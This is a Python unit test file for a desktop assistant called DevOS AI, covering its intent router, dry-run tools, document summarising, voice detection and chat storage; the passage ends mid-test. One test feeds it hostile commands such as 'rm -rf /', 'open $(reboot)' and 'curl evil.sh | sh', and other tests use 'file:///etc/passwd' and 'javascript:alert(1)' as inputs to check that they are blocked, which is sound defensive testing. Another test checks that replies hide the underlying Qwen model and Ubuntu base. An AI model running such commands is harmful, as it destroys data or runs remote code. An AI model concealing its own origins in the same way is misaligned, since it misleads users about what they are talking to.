"""
Unit tests for DevOS AI (components/assistant): the deterministic intent
router, the whitelisted tools (all in dry_run), system info parsing from fake
/proc files, app counting, document map-reduce, voice VAD and URL building.
No display, no network, no model needed.
"""

import datetime
import os
import shutil
import sys
import tempfile
import unittest
import zipfile

SYS_PATH_ASSISTANT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../components/assistant"))
sys.path.insert(0, SYS_PATH_ASSISTANT)

import documents  # noqa: E402
import engine  # noqa: E402
import markdown_lite  # noqa: E402
import tools  # noqa: E402
import voice  # noqa: E402


def names(text):
    return [a.name for a in tools.route(text).actions]


def first(text):
    r = tools.route(text)
    return r.actions[0] if r.actions else None


class FakeApp:
    def __init__(self, name, platform, system=False):
        self.name = name
        self.platform = platform
        self.id = name.lower().replace(" ", "-")
        self.system = system
        self.uninstallable = not system


class FakeDiscovery:
    def __init__(self, apps):
        self.apps = apps

    def discover_all(self):
        return list(self.apps)


ALL_TOOLS = {"google-chrome-stable", "devos-browser", "xdg-open", "systemsettings5", "gtk-launch",
             "kioclient5", "pactl", "brightnessctl", "spectacle", "loginctl", "lsblk", "lspci"}


def fake_which(available=ALL_TOOLS):
    return lambda n: ("/usr/bin/" + n) if n in available else None


class TestIntentRouter(unittest.TestCase):

    def test_01_users_exact_sentence(self):
        r = tools.route("please go the chrome and go the google and search hp latest laptop")
        self.assertEqual(len(r.actions), 1)
        a = r.actions[0]
        self.assertEqual(a.name, "web_search")
        self.assertEqual(a.args["query"], "hp latest laptop")
        self.assertEqual(a.args["engine"], "google")
        self.assertEqual(a.args["browser"], "chrome")
        self.assertEqual(a.args["url"], "https://www.google.com/search?q=hp+latest+laptop")

    def test_02_search_variants(self):
        cases = {
            "Please go to Chrome and go to Google and search HP latest laptop": ("google", "hp latest laptop"),
            "google best biryani in dhaka": ("google", "best biryani in dhaka"),
            "search for python tutorials": ("google", "python tutorials"),
            "Search youtube for lofi music": ("youtube", "lofi music"),
            "open youtube and search for cat videos": ("youtube", "cat videos"),
            "search hp laptop price on google": ("google", "hp laptop price"),
            "look up the weather in Dhaka": ("google", "the weather in dhaka"),
            "can you search the web for rtx 4060 reviews?": ("google", "rtx 4060 reviews"),
            "play arijit singh songs on youtube": ("youtube", "arijit singh songs"),
        }
        for text, (engine_name, query) in cases.items():
            with self.subTest(text=text):
                a = first(text)
                self.assertIsNotNone(a)
                self.assertEqual(a.name, "web_search")
                self.assertEqual(a.args["engine"], engine_name)
                self.assertEqual(a.args["query"], query)

    def test_03_bangla_search(self):
        a = first("এইচপি ল্যাপটপ গুগলে সার্চ করো")
        self.assertEqual(a.name, "web_search")
        self.assertEqual(a.args["query"], "এইচপি ল্যাপটপ")

    def test_04_system_info(self):
        cases = {
            "What is my PC config?": None,
            "show me my computer specs": None,
            "how much RAM do I have": ["ram"],
            "which processor is in this pc": ["cpu"],
            "how much disk space is left": ["disk"],
            "what graphics card do I have": ["gpu"],
            "check my battery": ["battery"],
            "আমার র‍্যাম কত": ["ram"],
        }
        for text, topics in cases.items():
            with self.subTest(text=text):
                a = first(text)
                self.assertIsNotNone(a, text)
                self.assertEqual(a.name, "system_info")
                if topics is None:
                    self.assertGreaterEqual(set(a.args["topics"]), {"cpu", "ram", "disk", "gpu", "os"})
                else:
                    self.assertEqual(a.args["topics"], topics)

    def test_05_two_info_questions_merge(self):
        r = tools.route("how much ram and cpu do i have")
        self.assertEqual(len(r.actions), 1)
        self.assertEqual(sorted(r.actions[0].args["topics"]), ["cpu", "ram"])

    def test_06_apps(self):
        self.assertEqual(first("how many apps are installed?").name, "count_apps")
        self.assertEqual(first("total applications").name, "count_apps")
        a = first("list my Windows apps")
        self.assertEqual((a.name, a.args["platform"]), ("list_apps", "windows"))
        a = first("how many android apps do i have")
        self.assertEqual((a.name, a.args["platform"]), ("count_apps", "android"))
        self.assertEqual(first("open the apps window").name, "open_tool")

    def test_07_open_app_and_sites(self):
        a = first("open notepad")
        self.assertEqual((a.name, a.args["name"]), ("open_app", "notepad"))
        a = first("launch the terminal app")
        self.assertEqual((a.name, a.args["name"]), ("open_app", "terminal"))
        a = first("go to chrome")
        self.assertEqual((a.name, a.args["name"]), ("open_app", "chrome"))
        a = first("open youtube.com")
        self.assertEqual((a.name, a.args["url"]), ("open_url", "https://youtube.com"))
        a = first("open google maps")
        self.assertEqual((a.name, a.args["url"]), ("open_url", "https://maps.google.com"))
        a = first("visit https://github.com/devos")
        self.assertEqual(a.args["url"], "https://github.com/devos")
        a = first("ক্রোম খোলো")
        self.assertEqual((a.name, a.args["name"]), ("open_app", "chrome"))

    def test_08_settings(self):
        cases = {
            "open wifi settings": "kcm_networkmanagement",
            "connect to wi-fi": "kcm_networkmanagement",
            "turn on bluetooth": "kcm_bluetooth",
            "change display settings": "kcm_kscreen",
            "sound settings": "kcm_pulseaudio",
            "set up a printer": "kcm_printer_manager",
        }
        for text, kcm in cases.items():
            with self.subTest(text=text):
                a = first(text)
                self.assertEqual(a.name, "open_settings")
                self.assertEqual(a.args["page"], kcm)
        self.assertEqual(first("open settings").args["page"], "")

    def test_09_quick_actions(self):
        self.assertEqual(first("volume up").args["op"], "up")
        self.assertEqual(first("turn the volume down").args["op"], "down")
        self.assertEqual(first("mute").args["op"], "mute")
        self.assertEqual(first("set volume to 40%").args, {"op": "set", "level": 40})
        self.assertEqual(first("increase brightness").args["op"], "up")
        self.assertEqual(first("dim the screen").args["op"], "down")
        self.assertEqual(first("take a screenshot").name, "screenshot")
        self.assertEqual(first("lock the screen").name, "lock")
        self.assertEqual(first("open my downloads folder").args["folder"], "downloads")
        self.assertEqual(first("free up disk space").name, "cleanup_scan")
        self.assertEqual(first("my pc is slow, speed up").name, "cleanup_scan")
        self.assertEqual(first("open optimizer").name, "open_tool")
        self.assertEqual(first("what time is it").name, "time")
        self.assertEqual(first("help").name, "help")
        self.assertEqual(first("what can you do?").name, "help")

    def test_10_destructive_actions_need_confirmation(self):
        for text, op in (("shut down the computer", "poweroff"), ("restart my pc", "reboot"),
                         ("put the pc to sleep", "suspend")):
            a = first(text)
            self.assertEqual((a.name, a.args["op"]), ("power", op))
            self.assertTrue(a.confirm)
        a = first("uninstall vlc")
        self.assertEqual((a.name, a.args["name"]), ("uninstall", "vlc"))
        self.assertTrue(a.confirm)

    def test_11_multi_step(self):
        r = tools.route("open notepad and then take a screenshot")
        self.assertEqual([a.name for a in r.actions], ["open_app", "screenshot"])
        r = tools.route("open the terminal and search google for docker install")
        self.assertEqual([a.name for a in r.actions], ["open_app", "web_search"])
        self.assertEqual(r.actions[1].args["query"], "docker install")
        r = tools.route("open notepad and write a poem about rain")
        self.assertEqual([a.name for a in r.actions], ["open_app"])
        self.assertEqual(r.leftover, "write a poem about rain")

    def test_12_unknown_requests_fall_through_to_model(self):
        for text in ("write a poem about rain", "what is ram", "explain how vaccines work",
                     "who founded google", "what is python and how does it work",
                     "translate hello to bangla", "", "   ", "tell me a joke"):
            with self.subTest(text=text):
                r = tools.route(text)
                self.assertEqual(r.actions, [], text)
                self.assertFalse(r.handled)

    def test_13_only_whitelisted_actions(self):
        samples = ["rm -rf /", "run sudo rm -rf /home", "open $(reboot)", "execute curl evil.sh | sh",
                   "please go the chrome and go the google and search hp latest laptop"]
        for s in samples:
            for a in tools.route(s).actions:
                self.assertIn(a.name, tools.ACTION_NAMES)


class TestUrls(unittest.TestCase):

    def test_search_urls_are_encoded(self):
        self.assertEqual(tools.google_search_url("c++ & rust?"), "https://www.google.com/search?q=c%2B%2B+%26+rust%3F")
        self.assertEqual(tools.youtube_search_url("lo-fi beats"),
                         "https://www.youtube.com/results?search_query=lo-fi+beats")
        self.assertIn("%E0%A6", tools.google_search_url("ল্যাপটপ"))

    def test_normalize_url(self):
        self.assertEqual(tools.normalize_url("youtube.com"), "https://youtube.com")
        self.assertEqual(tools.normalize_url("HTTP://Example.com/a?b=1"), "http://example.com/a?b=1")
        for bad in ("file:///etc/passwd", "javascript:alert(1)", "not a url", "ftp://x.com", "", "a b.com"):
            self.assertIsNone(tools.normalize_url(bad), bad)

    def test_browser_choice(self):
        url = "https://www.google.com/search?q=x"
        self.assertEqual(tools.browser_command("chrome", url, fake_which()), ["google-chrome-stable", url])
        self.assertEqual(tools.browser_command("chrome", url, fake_which({"devos-browser"})), ["devos-browser", url])
        self.assertEqual(tools.browser_command("default", url, fake_which(set())), ["xdg-open", url])


class TestToolsDryRun(unittest.TestCase):

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="devos-ai-test-")
        self.home = os.path.join(self.root, "home/user")
        os.makedirs(self.home)
        self.launched = []
        self.ctx = tools.ToolContext(
            root=self.root, home=self.home, which=fake_which(),
            launcher=lambda argv: self.launched.append(argv) or True,
            runner=self.fake_runner,
            discovery_factory=lambda: FakeDiscovery([
                FakeApp("Chrome", "linux"), FakeApp("VLC media player", "linux"), FakeApp("Notepad++", "windows"),
                FakeApp("WhatsApp", "android"), FakeApp("Paint.NET", "windows"),
                FakeApp("Files", "linux", system=True)]),
            now=lambda: datetime.datetime(2026, 10, 13, 9, 5, 0))
        self.write("proc/cpuinfo",
                   "processor\t: 0\nmodel name\t: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz\nphysical id\t: 0\n"
                   "cpu cores\t: 4\n\nprocessor\t: 1\nmodel name\t: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz\n"
                   "physical id\t: 0\ncpu cores\t: 4\n\n" +
                   "".join(f"processor\t: {i}\nphysical id\t: 0\ncpu cores\t: 4\n\n" for i in range(2, 8)))
        self.write("proc/meminfo", "MemTotal:       16303428 kB\nMemFree:         1000000 kB\n"
                                   "MemAvailable:    8151714 kB\nSwapTotal:       2097148 kB\nSwapFree: 2097148 kB\n")
        self.write("etc/os-release", 'NAME="DevOS"\nPRETTY_NAME="DevOS 2027"\nID=devos\n')
        self.write("proc/uptime", "93784.12 300000.00\n")
        self.write("sys/class/power_supply/BAT0/type", "Battery\n")
        self.write("sys/class/power_supply/BAT0/capacity", "87\n")
        self.write("sys/class/power_supply/BAT0/status", "Discharging\n")
        self.write("sys/class/power_supply/AC/type", "Mains\n")
        apps = "usr/share/applications"
        self.write(f"{apps}/devos-browser.desktop", "[Desktop Entry]\nType=Application\nName=Chrome\nExec=devos-browser %U\n")
        self.write(f"{apps}/devos-notepad.desktop", "[Desktop Entry]\nType=Application\nName=Notepad\nExec=notepad\n")
        self.write(f"{apps}/org.kde.konsole.desktop", "[Desktop Entry]\nType=Application\nName=Konsole\n"
                                                       "GenericName=Terminal\nExec=konsole\n")
        self.write(f"{apps}/vlc.desktop", "[Desktop Entry]\nType=Application\nName=VLC media player\n"
                                          "Keywords=video;music;\nExec=vlc %U\n")
        self.write(f"{apps}/org.kde.kcalc.desktop", "[Desktop Entry]\nType=Application\nName=KCalc\n"
                                                    "GenericName=Scientific Calculator\nExec=kcalc\n")

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, rel, text):
        p = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(text)

    def fake_runner(self, argv, timeout=8):
        if argv[0] == "lsblk":
            return 0, ('{"blockdevices":[{"name":"nvme0n1","size":512110190592,"model":"Samsung SSD 980",'
                       '"rota":false,"type":"disk"},{"name":"loop0","size":1000,"model":null,"rota":false,'
                       '"type":"loop"},{"name":"sda","size":1000204886016,"model":"WDC WD10","rota":true,'
                       '"type":"disk"}]}')
        if argv[0] == "lspci":
            return 0, ('00:02.0 "VGA compatible controller" "Intel Corporation" "UHD Graphics 620" -r07 "Dell" "x"\n'
                       '01:00.0 "3D controller" "NVIDIA Corporation" "GP108M [GeForce MX150]" -ra1 "Dell" "y"\n'
                       '00:1f.3 "Audio device" "Intel Corporation" "Sunrise Point-LP HD Audio" -r21 "Dell" "z"\n')
        return 0, ""

    def run_action(self, text):
        r = tools.route(text, self.ctx)
        self.assertTrue(r.actions, text)
        return [tools.execute(a, self.ctx, dry_run=True) for a in r.actions]

    def test_parse_cpuinfo(self):
        with open(os.path.join(self.root, "proc/cpuinfo")) as fh:
            cpu = tools.parse_cpuinfo(fh.read())
        self.assertEqual(cpu["cores"], 4)
        self.assertEqual(cpu["threads"], 8)
        self.assertIn("i5-8250U", cpu["model"])

    def test_system_info_from_fake_proc(self):
        res = self.run_action("what is my pc config")[0]
        self.assertTrue(res.ok)
        t = res.text
        self.assertIn("i5-8250U", t)
        self.assertIn("4 cores, 8 threads", t)
        self.assertIn("15.5 GB total", t)
        self.assertIn("7.8 GB in use (50%)", t)
        self.assertIn("DevOS 2027", t)
        self.assertIn("Intel UHD Graphics 620", t)
        self.assertIn("NVIDIA GeForce MX150", t)
        self.assertIn("NVMe SSD Samsung SSD 980", t)
        self.assertIn("HDD WDC WD10", t)
        self.assertNotIn("loop0", t)
        self.assertIn("87%, discharging", t)
        self.assertIn("1 day, 2 hours", t)
        self.assertEqual(self.launched, [])

    def test_ram_only(self):
        t = self.run_action("how much ram do i have")[0].text
        self.assertIn("Memory", t)
        self.assertNotIn("Processor", t)

    def test_os_name_never_shows_base_distro(self):
        self.assertEqual(tools.os_display_name({"PRETTY_NAME": "Ubuntu 24.04.1 LTS"}), "DevOS")
        self.assertEqual(tools.os_display_name({"PRETTY_NAME": "DevOS 2027"}), "DevOS 2027")

    def test_count_apps(self):
        res = self.run_action("how many apps are installed")[0]
        self.assertEqual(res.data["total"], 6)
        self.assertEqual(res.data["counts"], {"linux": 3, "windows": 2, "android": 1})
        self.assertIn("**6 apps**", res.text)
        res = self.run_action("how many windows apps do I have")[0]
        self.assertIn("2 Windows apps", res.text)

    def test_list_apps(self):
        res = self.run_action("list my windows apps")[0]
        self.assertEqual(res.data["names"], ["Notepad++", "Paint.NET"])

    def test_count_apps_discovery_failure(self):
        ctx = tools.ToolContext(root=self.root, home=self.home, discovery_factory=lambda: None)
        res = tools.execute(tools.Action("count_apps", {}), ctx, dry_run=True)
        self.assertFalse(res.ok)

    def test_users_sentence_dry_run_plan(self):
        res = self.run_action("please go the chrome and go the google and search hp latest laptop")
        self.assertEqual(res[0].plan, [["google-chrome-stable", "https://www.google.com/search?q=hp+latest+laptop"]])
        self.assertEqual(self.launched, [])

    def test_open_app_fuzzy(self):
        cases = {"open chrome": "devos-browser", "open notepad": "devos-notepad",
                 "open terminal": "org.kde.konsole", "launch vlc": "vlc", "open calculator": "org.kde.kcalc",
                 "open vlc media": "vlc", "start notpad": "devos-notepad"}
        for text, did in cases.items():
            with self.subTest(text=text):
                res = self.run_action(text)[0]
                self.assertTrue(res.ok, res.text)
                self.assertEqual(res.data["desktop_id"], did)
                self.assertEqual(res.plan[0], ["gtk-launch", did])

    def test_open_unknown_app(self):
        res = self.run_action("open photoshop")[0]
        self.assertFalse(res.ok)
        self.assertIn("couldn't find", res.text)

    def test_settings_and_quick_actions_plans(self):
        self.assertEqual(self.run_action("open bluetooth settings")[0].plan, [["systemsettings5", "kcm_bluetooth"]])
        self.assertEqual(self.run_action("volume up")[0].plan, [["pactl", "set-sink-volume", "@DEFAULT_SINK@", "+10%"]])
        self.assertEqual(self.run_action("mute")[0].plan, [["pactl", "set-sink-mute", "@DEFAULT_SINK@", "1"]])
        self.assertEqual(self.run_action("brightness to 70")[0].plan, [["brightnessctl", "set", "70%"]])
        self.assertEqual(self.run_action("lock my computer")[0].plan, [["loginctl", "lock-session"]])
        shot = self.run_action("take a screenshot")[0]
        self.assertEqual(shot.plan[0][:5], ["spectacle", "-b", "-n", "-f", "-d"])
        self.assertTrue(shot.plan[0][-1].endswith("Pictures/Screenshots/Screenshot_2026-10-13_09-05-00.png"))
        self.assertEqual(self.run_action("open downloads")[0].plan,
                         [["xdg-open", os.path.join(self.home, "Downloads")]])
        self.assertEqual(self.launched, [])

    def test_power_dry_run(self):
        res = self.run_action("restart the computer")[0]
        self.assertEqual(res.plan, [["systemctl", "reboot"]])
        self.assertEqual(self.launched, [])

    def test_uninstall_plan_and_system_apps(self):
        res = self.run_action("uninstall vlc")[0]
        self.assertTrue(res.ok, res.text)
        self.assertIn(res.plan[0][-2:], (["--uninstall", "vlc-media-player"], ["--feature", "vlc"]))
        res = tools.execute(tools.Action("uninstall", {"name": "Files"}), self.ctx, dry_run=True)
        self.assertFalse(res.ok)

    def test_cleanup_scan_uses_optimizer(self):
        class FakeOpt:
            @staticmethod
            def scan_all():
                return [{"id": "cache", "label": "App caches", "size": 300 * 1024 * 1024, "_entries": []},
                        {"id": "trash", "label": "Trash", "size": 0}]

            @staticmethod
            def public_scan(r):
                return [{k: v for k, v in x.items() if not k.startswith("_")} for x in r]

            @staticmethod
            def disk_status():
                return []

            @staticmethod
            def low_disk(s):
                return []
        ctx = tools.ToolContext(root=self.root, home=self.home, optimizer_module=FakeOpt)
        res = tools.execute(tools.Action("cleanup_scan"), ctx, dry_run=True)
        self.assertIn("300.0 MB", res.text)
        self.assertIn("App caches", res.text)
        self.assertNotIn("Trash", res.text)
        self.assertIn("Nothing has been deleted", res.text)

    def test_time(self):
        self.assertIn("9:05 AM", self.run_action("what time is it")[0].text)


class FakeModel:
    def __init__(self):
        self.prompts = []

    def __call__(self, prompt):
        self.prompts.append(prompt)
        return f"- point {len(self.prompts)}"


class TestDocuments(unittest.TestCase):

    def long_text(self, n_paras=120):
        return "\n\n".join(f"Paragraph {i}. " + ("Laptops and batteries are discussed here. " * 4 if i == 77 else
                                                  "General filler text about many unrelated topics. " * 3)
                           for i in range(n_paras))

    def test_chunking_keeps_size(self):
        chunks = documents.chunk_text(self.long_text(), size=1200)
        self.assertGreater(len(chunks), 5)
        self.assertTrue(all(len(c) <= 1200 for c in chunks))
        self.assertTrue(chunks[0].startswith("Paragraph 0."))

    def test_short_text_single_call(self):
        m = FakeModel()
        summary, calls = documents.summarize("A short note about DevOS.", m)
        self.assertEqual(calls, 1)
        self.assertEqual(len(m.prompts), 1)

    def test_map_reduce_at_most_four_calls(self):
        text = self.long_text(600)    # ~100k chars
        plan = documents.summary_plan(text)
        self.assertLessEqual(len(plan), 3)
        self.assertTrue(all(len(p) <= documents.CONTEXT_CHARS for p in plan))
        m = FakeModel()
        summary, calls = documents.summarize(text, m)
        self.assertEqual(calls, len(plan) + 1)
        self.assertLessEqual(calls, documents.MAX_CALLS)
        self.assertEqual(len(m.prompts), calls)
        self.assertIn("Part 1:", m.prompts[-1])
        self.assertTrue(all(len(p) < documents.CONTEXT_CHARS + 600 for p in m.prompts))

    def test_question_picks_relevant_chunk(self):
        text = self.long_text(300)
        ctx = documents.relevant_context(text, "What does it say about laptop batteries?")
        self.assertIn("Paragraph 77.", ctx)
        self.assertLessEqual(len(ctx), documents.CONTEXT_CHARS)
        m = FakeModel()
        documents.answer_question(text, "laptop batteries?", m)
        self.assertEqual(len(m.prompts), 1)

    def test_wants_summary(self):
        self.assertTrue(documents.wants_summary("summarize this pdf"))
        self.assertTrue(documents.wants_summary(""))
        self.assertTrue(documents.wants_summary("what is this document about?"))
        self.assertFalse(documents.wants_summary("what is the total amount on the invoice?"))

    def test_extract_text_and_docx(self):
        d = tempfile.mkdtemp()
        try:
            p = os.path.join(d, "a.md")
            with open(p, "w") as fh:
                fh.write("# Title\r\n\r\n\r\n\r\nBody")
            self.assertEqual(documents.extract_text(p), ("# Title\n\nBody", ""))
            docx = os.path.join(d, "b.docx")
            with zipfile.ZipFile(docx, "w") as z:
                z.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Hello &amp; welcome</w:t>"
                                                "</w:r></w:p><w:p><w:r><w:t>Line two</w:t></w:r></w:p></w:body></w:document>")
            self.assertEqual(documents.extract_text(docx)[0], "Hello & welcome\nLine two")
            pdf = os.path.join(d, "c.pdf")
            with open(pdf, "wb") as fh:
                fh.write(b"%PDF-1.4\n")
            text, problem = documents.extract_text(pdf, which=lambda n: None)
            self.assertEqual(text, "")
            self.assertEqual(problem, documents.PDF_TOOL_MISSING)
            text, problem = documents.extract_text(pdf, which=lambda n: "/usr/bin/" + n,
                                                   runner=lambda argv: (0, "Invoice\fTotal 42"))
            self.assertEqual((text, problem), ("Invoice\n\nTotal 42", ""))
        finally:
            shutil.rmtree(d)


class TestVoice(unittest.TestCase):

    def test_rms(self):
        self.assertEqual(voice.rms(b""), 0.0)
        self.assertAlmostEqual(voice.rms([3, -4, 3, -4]), 3.5355, places=3)
        tone = voice.synth_tone(0.1, 10000)
        self.assertAlmostEqual(voice.rms(tone), 10000 / 2 ** 0.5, delta=150)

    def test_vad_stops_after_speech_then_silence(self):
        pcm = voice.synth_tone(0.5, 40) + voice.synth_tone(1.0, 8000) + voice.synth_tone(3.0, 40)
        vad = voice.VAD()
        stopped_at = None
        for i, f in enumerate(voice.frames(pcm)):
            if vad.feed(f):
                stopped_at = (i + 1) * voice.FRAME_MS / 1000
                break
        self.assertEqual(vad.stop_reason, "silence")
        self.assertTrue(vad.heard_speech)
        self.assertAlmostEqual(stopped_at, 1.5 + voice.SILENCE_STOP_S, delta=0.21)

    def test_vad_short_pause_does_not_stop(self):
        pcm = (voice.synth_tone(0.8, 8000) + voice.synth_tone(0.6, 30) + voice.synth_tone(0.8, 8000))
        vad = voice.VAD()
        self.assertFalse(any(vad.feed(f) for f in voice.frames(pcm)))

    def test_vad_no_speech_timeout(self):
        vad = voice.VAD(no_speech_s=2.0)
        results = [vad.feed(f) for f in voice.frames(voice.synth_tone(3.0, 50))]
        self.assertTrue(any(results))
        self.assertEqual(vad.stop_reason, "no-speech")

    def test_wav(self):
        wav = voice.pcm_to_wav(voice.synth_tone(0.1, 1000))
        self.assertTrue(wav.startswith(b"RIFF"))

    def test_transcript_fixes_feed_the_router(self):
        self.assertEqual(voice.fix_transcript("what is my pc can fig"), "what is my pc config")
        self.assertEqual(first(voice.fix_transcript("open blue tooth settings")).args["page"], "kcm_bluetooth")
        self.assertEqual(first(voice.fix_transcript("search you tube for cats")).args["engine"], "youtube")

    def test_record_command(self):
        self.assertEqual(voice.record_command(lambda n: None), None)
        self.assertEqual(voice.record_command(fake_which({"arecord"}))[0], "arecord")


class FakeLocalModel:
    def __init__(self, reply="Sure.", loaded=True):
        self.reply = reply
        self.loaded = loaded
        self.calls = []

    def chat(self, messages):
        self.calls.append(messages)
        if not self.loaded:
            raise engine.ModelUnavailable(engine.MODEL_MISSING)
        return self.reply

    def health(self):
        return {"status": "healthy"}


class TestEngine(unittest.TestCase):

    def test_unknown_goes_to_model_and_is_scrubbed(self):
        m = FakeLocalModel("I am Qwen2.5, made by Alibaba Cloud, running on Ubuntu 24.04 with KDE Plasma.")
        ctx = tools.ToolContext(root="/nonexistent", which=lambda n: None, launcher=lambda a: True)
        a = engine.Assistant(model=m, ctx=ctx)
        self.assertFalse(a.plan("tell me a joke").handled)
        reply = a.chat("who are you?")
        for bad in ("Qwen", "Alibaba", "Ubuntu", "KDE", "Plasma"):
            self.assertNotIn(bad, reply.text)
        self.assertIn("DevOS AI", reply.text)
        self.assertEqual(m.calls[0][0]["role"], "system")

    def test_model_missing_message(self):
        a = engine.Assistant(model=FakeLocalModel(loaded=False), ctx=tools.ToolContext(root="/nonexistent"))
        r = a.chat("hello")
        self.assertFalse(r.ok)
        self.assertIn("isn't installed", r.text)

    def test_weak_open_falls_back_to_model(self):
        m = FakeLocalModel("Here is some advice.")
        ctx = tools.ToolContext(root="/nonexistent", app_dirs=[], which=lambda n: None, launcher=lambda a: True)
        a = engine.Assistant(model=m, ctx=ctx)
        plan = a.plan("start a business")
        replies = a.run_actions(plan.actions, "start a business", plan.leftover, dry_run=True)
        self.assertEqual(replies[0].text, "Here is some advice.")

    def test_history_keeps_last_turns(self):
        d = tempfile.mkdtemp()
        try:
            h = engine.History(os.path.join(d, "x", "history.json"), turns=3)
            for i in range(6):
                h.add("user", f"q{i}")
                h.add("assistant", f"a{i}")
            h.save()
            h2 = engine.History(h.path, turns=3).load()
            self.assertEqual([m["text"] for m in h2.messages], ["q3", "a3", "q4", "a4", "q5", "a5"])
            self.assertEqual(h2.for_model(limit=2)[0], {"role": "user", "content": "q5"})
        finally:
            shutil.rmtree(d)


class TestMarkdown(unittest.TestCase):

    def test_markdown_lite(self):
        h = markdown_lite.to_html("**Bold** and `code`\n\n- one\n- two\n\n```\nx < 1\n```")
        self.assertIn("<b>Bold</b>", h)
        self.assertIn("code</code>", h.replace("&nbsp;", ""))
        self.assertIn("<li", h)
        self.assertIn("x &lt; 1", h)
        self.assertNotIn("<script", markdown_lite.to_html("<script>alert(1)</script>"))


if __name__ == "__main__":
    unittest.main()


class TestAboutDevOS(unittest.TestCase):
    """Creator questions get the fixed answer with the real names and links."""

    def test_creator_questions(self):
        import tools as _tools
        for q in ["who built you", "who made devos", "devos team me whose", "where is the source code",
                  "who is the creator", "is devos open source"]:
            self.assertEqual([a.name for a in _tools.route(q).actions], ["about"], q)
        self.assertIn("Imran Ahmed", _tools.ABOUT_TEXT)
        self.assertIn("https://imrandev.bd/", _tools.ABOUT_TEXT)
        self.assertIn("https://github.com/imranbru99/DevOS", _tools.ABOUT_TEXT)

    def test_websites_are_still_websites(self):
        import tools as _tools
        self.assertNotEqual([a.name for a in _tools.route("open github.com/devos").actions], ["about"])


# ---------------------------------------------------------------------------
# Conversations, streaming, voice engine, "Smarter DevOS AI", branding
# ---------------------------------------------------------------------------

import ast  # noqa: E402
import http.server  # noqa: E402
import json  # noqa: E402
import threading  # noqa: E402
import time  # noqa: E402
import types  # noqa: E402


class TestChatStore(unittest.TestCase):

    def setUp(self):
        self.d = tempfile.mkdtemp(prefix="devos-chats-")

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def test_title_trim(self):
        self.assertEqual(engine.chat_title("  hello\n  world "), "hello world")
        t = engine.chat_title("x" * 100)
        self.assertEqual(len(t), 40)
        self.assertTrue(t.endswith("…"))
        self.assertEqual(engine.chat_title(""), "New chat")

    def test_migrates_old_history(self):
        old = engine.History(os.path.join(self.d, "history.json"))
        old.add("user", "What is my PC config and how much RAM is free right now?")
        old.add("assistant", "Here it is.")
        old.save()
        store = engine.ChatStore(self.d).load()
        self.assertEqual(len(store.chats), 1)
        c = store.chats[0]
        self.assertEqual(c["title"], engine.chat_title("What is my PC config and how much RAM is free right now?"))
        self.assertTrue(os.path.isfile(os.path.join(self.d, "chats", "index.json")))
        self.assertFalse(os.path.exists(os.path.join(self.d, "history.json")))
        self.assertEqual([m["text"] for m in store.open(c["id"]).messages][1], "Here it is.")
        # a second load does not migrate again
        self.assertEqual(len(engine.ChatStore(self.d).load().chats), 1)

    def test_new_rename_delete_search(self):
        store = engine.ChatStore(self.d).load()
        self.assertEqual(store.chats, [])
        h = store.new_history()
        self.assertEqual(store.chats, [], "a chat appears only after its first message")
        h.add("user", "Open wifi settings")
        h.save()
        store.touch(h)
        h2 = store.new_history()
        h2.add("user", "Tell me about laptops")
        h2.add("assistant", "Batteries matter.")
        h2.save()
        store.touch(h2)
        self.assertEqual([c["title"] for c in store.chats], ["Tell me about laptops", "Open wifi settings"])
        self.assertEqual([c["title"] for c in store.search("wifi")], ["Open wifi settings"])
        self.assertEqual([c["title"] for c in store.search("batteries")], ["Tell me about laptops"])
        self.assertTrue(store.rename(h.chat_id, "  Wi-Fi help "))
        again = engine.ChatStore(self.d).load()
        self.assertEqual(again.get(h.chat_id)["title"], "Wi-Fi help")
        self.assertTrue(again.delete(h2.chat_id))
        self.assertFalse(os.path.exists(again.path_for(h2.chat_id)))
        self.assertEqual([c["id"] for c in engine.ChatStore(self.d).load().chats], [h.chat_id])

    def test_groups(self):
        now = time.mktime((2026, 10, 13, 15, 0, 0, 0, 0, -1))
        self.assertEqual(engine.day_group(now - 3600, now), "Today")
        self.assertEqual(engine.day_group(now - 86400, now), "Yesterday")
        self.assertEqual(engine.day_group(now - 5 * 86400, now), "Earlier")
        store = engine.ChatStore(self.d)
        store.chats = [{"id": "a", "title": "A", "updated": now - 60}, {"id": "b", "title": "B", "updated": now - 86400},
                       {"id": "c", "title": "C", "updated": now - 9 * 86400}]
        self.assertEqual([(g, [c["id"] for c in cs]) for g, cs in store.grouped(now=now)],
                         [("Today", ["a"]), ("Yesterday", ["b"]), ("Earlier", ["c"])])


class FakeSSEServer:
    """Serves /v1/chat/completions as server-sent events (or plain JSON)."""

    def __init__(self, pieces, delay=0.0, json_only=False):
        outer = self
        self.requests = []

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                outer.requests.append(body)
                if json_only or not body.get("stream"):
                    data = json.dumps({"choices": [{"message": {"content": "".join(pieces)}}]}).encode()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
                    return
                self.send_response(200)
                self.send_header("Content-Type", "text/event-stream")
                self.end_headers()
                try:
                    self.wfile.write(b": keep-alive\n\n")
                    for p in pieces:
                        self.wfile.write(b"data: " + json.dumps({"choices": [{"delta": {"content": p}}]}).encode()
                                         + b"\n\n")
                        self.wfile.flush()
                        time.sleep(delay)
                    self.wfile.write(b"data: [DONE]\n\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass

        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}"
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def close(self):
        self.httpd.shutdown()
        self.httpd.server_close()


class TestStreaming(unittest.TestCase):

    def test_stream_pieces_arrive_in_order(self):
        srv = FakeSSEServer(["Hello", " there", ", I am", " Qwen."])
        try:
            got = []
            text = engine.LocalModel(srv.url, timeout=5).chat([{"role": "user", "content": "hi"}], on_delta=got.append)
